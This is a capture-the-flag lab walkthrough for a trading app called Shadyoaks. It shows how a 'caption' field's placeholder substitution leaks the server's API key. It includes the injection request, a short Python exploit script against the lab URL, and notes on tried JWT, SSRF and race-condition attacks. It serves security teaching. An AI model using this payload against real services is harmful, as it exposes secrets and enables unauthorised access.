# shadyoaks-007 - BugForge Lab Walkthrough

**URL:** https://lab-1783871281331-pszo1a.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Template injection field mismatch (unrestricted placeholder substitution)
**Flag:** `bug{pMCqZqCOQgeNF0br85iCllG0dIdOXywP}`

---

## Summary

Shadyoaks is a React/Express stock trading and portfolio app with a custom forecasting feature. `POST /api/forecast/indicator` accepts two related fields: `formula`, which is passed through a properly sandboxed expression evaluator (character whitelist, variable whitelist), and `caption`, a separate field intended purely for display text. The `caption` field is run through its own placeholder-substitution step against the server's internal context, with no restriction on which placeholders can be referenced. Requesting `{api_key}` as the caption returns the server's API key directly in the response.

## Tech Stack

- Frontend: React SPA
- Backend: Express.js
- Auth: JWT
- Custom formula parser for `/api/forecast/indicator` (whitelisted variables only: `price`, `sma`, `ema`, `min`, `max`, `avg`, `count`; rejects unknown characters and variables)

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | none | Returns token directly |
| `POST /api/forecast/indicator` | Bearer | Body: `stock_id`, `formula`, `caption` - the vulnerable sink |
| `GET /api/forecast/:id` | Bearer | Returns forecast data for a stock |

## Attack Chain

### Step 1 - Register and confirm the endpoint

```
POST /api/register {"username","email","password"}
-> bearer token
```

### Step 2 - Test the formula field

`POST /api/forecast/indicator` with a `formula` value works only for the whitelisted variables (`price`, `sma`, `ema`, `min`, `max`, `avg`, `count`). Any other variable name or special character is rejected with an "Unknown variable" or "Invalid character in formula" error. This field is fully sandboxed.

### Step 3 - Test the caption field separately

The `caption` field is documented (implicitly, via its behavior) as free-form display text, and is not passed through the same validator as `formula`. Submitting a placeholder-style value in `caption` gets substituted against the server's internal template context rather than being treated as a literal string.

### Step 4 - Request the API key directly

```json
POST /api/forecast/indicator
{
  "stock_id": 1,
  "formula": "price",
  "caption": "{api_key}"
}
```

Response:

```json
{
  "...": "...",
  "caption": "bug{pMCqZqCOQgeNF0br85iCllG0dIdOXywP}"
}
```

The `caption` field returns the flag directly, since the server's internal context used for placeholder substitution includes the API key.

## Exploit

```python
import requests

TARGET = "https://lab-1783871281331-pszo1a.labs-app.bugforge.io"

def register():
    r = requests.post(f"{TARGET}/api/register", json={
        "username": "pentest",
        "email": "pentest@example.com",
        "password": "Passw0rd!123",
    })
    return r.json()["token"]

def get_indicator(token):
    r = requests.post(
        f"{TARGET}/api/forecast/indicator",
        headers={"Authorization": f"Bearer {token}"},
        json={"stock_id": 1, "formula": "price", "caption": "{api_key}"},
    )
    return r.json()

token = register()
result = get_indicator(token)
print(result["caption"])
# bug{pMCqZqCOQgeNF0br85iCllG0dIdOXywP}
```

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Injection/escape attempts directly on `formula` | Character and variable whitelist rejects anything outside `price`/`sma`/`ema`/`min`/`max`/`avg`/`count` | The sandboxed field is a dead end on its own - the real bug is in an adjacent field that shares the same feature but not the same validator |
| Mass assignment on registration/profile fields | `role` hard-sanitized server-side, `is_premium` defaults true regardless of input (not exploitable) | Not every unusual default is a vuln |
| JWT alg:none and weak-secret dictionary attack | Signature verification enforced, secret not in common wordlists | Standard JWT attacks fully hardened here |
| Blind SSRF via alert webhook URL | Confirmed the server fetches attacker-controlled URLs server-side with no IP blocklist, but the request is fire-and-forget with no response proxied back | Real bug, but no read-back channel to turn it into data exfiltration |
| Currency conversion race condition | Confirmed via concurrent requests that some checks race, but the outcome is a lost-update (last write wins), not a compounding balance exploit | A confirmed race condition is not automatically a weaponizable one |

## Root Cause

`caption` and `formula` are two fields on the same endpoint that both reference "template-like" data, but only one of them was built with an input validator:

```javascript
// Vulnerable pattern (approximate)
const formulaResult = evaluateSandboxed(formula); // whitelisted vars/chars only
const captionResult = substitutePlaceholders(caption, serverContext); // no restriction
```

`substitutePlaceholders` resolves any `{key}` pattern against the full server-side context object, which includes sensitive values such as the API key, instead of being limited to a small set of safe display tokens (or being treated as plain text at all).

## CWE / OWASP

- **CWE-1336**: Improper Neutralization of Special Elements Used in a Template Engine (Server-Side Template Injection variant - inconsistent sandboxing across two related fields)
- **OWASP A03:2021** - Injection
